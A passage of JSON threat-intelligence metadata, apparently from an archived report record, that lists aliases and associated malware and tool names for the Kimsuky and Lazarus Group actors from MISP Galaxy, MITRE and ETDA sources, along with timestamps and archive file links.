                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1641232276,
    "ts_modification_date": 1641232276,
    "files": {
        "pdf": "https://archive.orkl.eu/3cef77aed2d0be3eeacd1f63d421ece2656f7a93.pdf",
        "text": "https://archive.orkl.eu/3cef77aed2d0be3eeacd1f63d421ece2656f7a93.txt",
        "img": "https://archive.orkl.eu/3cef77aed2d0be3eeacd1f63d421ece2656f7a93.jpg"
    }
}